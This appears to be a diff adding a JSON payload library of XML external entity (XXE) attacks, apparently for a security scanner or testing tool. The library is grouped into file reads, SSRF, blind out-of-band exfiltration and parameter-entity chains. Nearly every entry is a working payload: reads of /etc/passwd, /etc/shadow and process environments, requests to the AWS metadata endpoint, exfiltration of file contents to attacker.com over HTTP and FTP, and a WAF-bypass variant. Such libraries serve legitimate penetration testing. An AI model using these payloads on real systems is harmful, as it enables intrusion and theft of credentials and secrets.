@@ -1,0 +1,43 @@
+{
+  "category": "xxe",
+  "contexts": {
+    "file_read": {
+      "description": "XXE payloads for reading local files via XML external entities",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "description": "Classic XXE file read /etc/passwd", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>", "description": "XXE file read /etc/shadow", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>", "description": "XXE process environment variables", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>", "description": "XXE with PHP filter wrapper for base64 encoded read", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/config.php\">]><root>&xxe;</root>", "description": "XXE PHP source code read via filter", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>", "description": "XXE Windows file read", "waf_bypass": false}
+      ]
+    },
+    "ssrf": {
+      "description": "XXE payloads for Server-Side Request Forgery via external entities",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", "description": "XXE SSRF to AWS IMDSv1", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><root>&xxe;</root>", "description": "XXE SSRF to external server for detection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/internal/api\">]><root>&xxe;</root>", "description": "XXE SSRF to internal service", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><root>&xxe;</root>", "description": "XXE SSRF to internal network gateway", "waf_bypass": false}
+      ]
+    },
+    "blind_oob": {
+      "description": "Blind XXE payloads using out-of-band data exfiltration",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external malicious DTD", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/exfil.dtd\"> %dtd;]><root>&send;</root>", "description": "Blind XXE two-stage file exfil via external DTD", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://attacker.com:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration", "waf_bypass": false},
+        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on attacker server)", "waf_bypass": false}
+      ]
+    },
+    "parameter_entity": {
+      "description": "XXE payloads using XML parameter entities for advanced exploitation",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe; %payload; %send;]><root>test</root>", "description": "Parameter entity chain loading external DTD", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><root>test</root>", "description": "External DOCTYPE for blind XXE via SYSTEM identifier", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> %local_dtd;]><root>&ISOtech;</root>", "description": "Error-based XXE repurposing local DTD file", "waf_bypass": true},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\">]><message>&start;&file;&end;</message>", "description": "CDATA wrapping to handle special chars in exfiltrated data", "waf_bypass": false}
+      ]
+    }
+  }
+}
